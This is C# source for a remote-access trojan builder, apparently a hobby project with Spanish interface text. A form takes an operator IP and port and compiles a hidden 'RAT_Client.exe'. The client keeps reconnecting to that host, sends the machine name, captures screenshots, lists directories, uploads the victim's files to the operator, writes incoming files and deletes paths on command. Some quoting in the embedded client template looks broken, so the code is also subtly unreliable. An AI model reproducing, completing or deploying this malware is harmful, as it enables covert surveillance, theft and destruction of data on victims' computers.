using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Windows.Forms;
using Microsoft.CSharp;

namespace RAT_Server
{
    public partial class BuilderForm : Form
    {
        public BuilderForm()
        {
            InitializeComponent();
        }

        private void buttonBuild_Click(object sender, EventArgs e)
        {
            string ip = textBoxIP.Text.Trim();
            string port = textBoxPort.Text.Trim();

            if (string.IsNullOrEmpty(ip) || string.IsNullOrEmpty(port))
            {
                MessageBox.Show("Por favor, introduce una IP y un Puerto válidos.");
                return;
            }

            if (!System.Net.IPAddress.TryParse(ip, out _))
            {
                MessageBox.Show("La dirección IP no es válida.");
                return;
            }

            if (!int.TryParse(port, out int portNumber) || portNumber < 1 || portNumber > 65535)
            {
                MessageBox.Show("El puerto debe ser un número entre 1 y 65535.");
                return;
            }

            SaveFileDialog saveFileDialog = new SaveFileDialog
            {
                Filter = "Archivos ejecutables (*.exe)|*.exe",
                Title = "Guardar cliente",
                FileName = "RAT_Client.exe"
            };

            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    string outputPath = saveFileDialog.FileName;
                    BuildClient(ip, portNumber, outputPath);
                    MessageBox.Show($"Cliente generado correctamente en:\n{outputPath}");
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error al generar el cliente: {ex.Message}");
                }
            }
        }

        private void BuildClient(string ip, int port, string outputPath)
        {
            // Código del cliente como plantilla
            string clientCode = @"
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace RAT_Client
{{
    static class Program
    {{
        static void Main()
        {{
            string serverIp = ""{0}"";
            int serverPort = {1};

            while (true)
            {{
                TcpClient client = null;
                NetworkStream stream = null;

                try
                {{
                    client = new TcpClient();
                    client.Connect(serverIp, serverPort);

                    stream = client.GetStream();
                    using (StreamWriter writer = new StreamWriter(stream))
                    using (StreamReader reader = new StreamReader(stream))
                    {{
                        writer.WriteLine(Environment.MachineName);
                        writer.Flush();

                        while (client.Connected)
                        {{
                            string command = reader.ReadLine();
                            if (command == null) break;

                            if (command == ""GET_SCREEN"")
                            {{
                                SendScreen(stream);
                            }}
                            else if (command.StartsWith(""LIST|""))
                            {{
                                SendList(writer, command.Substring(5));
                            }}
                            else if (command.StartsWith(""DOWNLOAD|""))
                            {{
                                SendFile(stream, writer, command.Substring(9));
                            }}
                            else if (command.StartsWith(""UPLOAD|""))
                            {{
                                ReceiveFile(stream, writer, command);
                            }}
                            else if (command.StartsWith(""DELETE|""))
                            {{
                                DeletePath(writer, command.Substring(7));
                            }}
                        }}
                    }}
                }}
                catch (Exception ex)
                {{
                    Console.WriteLine(""Error: "" + ex.Message);
                }}
                finally
                {{
                    if (stream != null) stream.Close();
                    if (client != null) client.Close();
                }}

                Thread.Sleep(5000);
            }}
        }}

        private static void SendScreen(NetworkStream stream)
        {{
            try
            {{
                var screen = CaptureScreen();

                using (var memoryStream = new MemoryStream())
                {{
                    screen.Save(memoryStream, ImageFormat.Jpeg);
                    var buffer = memoryStream.ToArray();

                    var length = BitConverter.GetBytes(buffer.Length);
                    stream.Write(length, 0, length.Length); // Enviar tamaño
                    stream.Write(buffer, 0, buffer.Length); // Enviar imagen
                    stream.Flush();
                }}
            }}
            catch (Exception ex)
            {{
                Console.WriteLine(""Error al enviar la pantalla: "" + ex.Message);
            }}
        }}

        private static Bitmap CaptureScreen()
        {{
            var bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
            var bitmap = new Bitmap(bounds.Width, bounds.Height);

            using (var g = Graphics.FromImage(bitmap))
            {{
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }}

            return bitmap;
        }}

        private static void SendList(StreamWriter writer, string path)
        {{
            try
            {{

    

                var dirs = string.Join(";", Directory.GetDirectories(path));
                var files = string.Join(";", Directory.GetFiles(path));
                writer.WriteLine($"{{dirs}}|{{files}}");

                writer.Flush();
            }}
            catch (Exception ex)
            {{

                writer.WriteLine($"ERROR:{{ex.Message}}");
 
                writer.Flush();
            }}
        }}

        private static void SendFile(NetworkStream stream, StreamWriter writer, string path)
        {{
            try
            {{
                var buffer = File.ReadAllBytes(path);
                writer.WriteLine(buffer.Length.ToString());
                writer.Flush();
                stream.Write(buffer, 0, buffer.Length);
            }}
            catch (Exception ex)
            {{

                writer.WriteLine($"ERROR:{{ex.Message}}");
 
                writer.Flush();
            }}
        }}

        private static void ReceiveFile(NetworkStream stream, StreamWriter writer, string command)
        {{
            try
            {{
                var parts = command.Split('|');
                if (parts.Length != 3 || !int.TryParse(parts[2], out int size))
                {{


                    writer.WriteLine("ERROR:INVALID_UPLOAD_COMMAND");

                    writer.Flush();
                    return;
                }}

                var buffer = new byte[size];
                int read = 0;
                while (read < size)
                {{
                    int r = stream.Read(buffer, read, size - read);
                    if (r <= 0) break;
                    read += r;
                }}
                File.WriteAllBytes(parts[1], buffer);



                writer.WriteLine("OK");
                writer.Flush();
            }}
            catch (Exception ex)
            {{

                writer.WriteLine($"ERROR:{{ex.Message}}");

                writer.Flush();
            }}
        }}

        private static void DeletePath(StreamWriter writer, string path)
        {{
            try
            {{
                if (File.Exists(path))
                {{
                    File.Delete(path);
                }}
                else if (Directory.Exists(path))
                {{
                    Directory.Delete(path, true);
                }}
                writer.WriteLine("OK");
                writer.Flush();
            }}
            catch (Exception ex)
            {{



                writer.WriteLine($"ERROR:{{ex.Message}}");
                writer.Flush();
            }}
        }}
    }}
}}
";

            // Formatear el código con los valores de IP y puerto
            clientCode = string.Format(clientCode, ip, port);

            // Configurar el compilador
            CSharpCodeProvider codeProvider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = outputPath,
                CompilerOptions = "/target:winexe",
                ReferencedAssemblies =
                {
                    "System.dll",
                    "System.Drawing.dll",
                    "System.Windows.Forms.dll",
                    "System.Net.dll"
                }
            };

            

            // Compilar el cliente
            CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, clientCode);

            if (results.Errors.HasErrors)
            {
                string errors = "";
                foreach (CompilerError error in results.Errors)
                {
                    errors += $"{error.ErrorText} (Línea {error.Line})\n";
                }
                throw new Exception($"Error en la compilación:\n{errors}");
            }
        }
    }
}
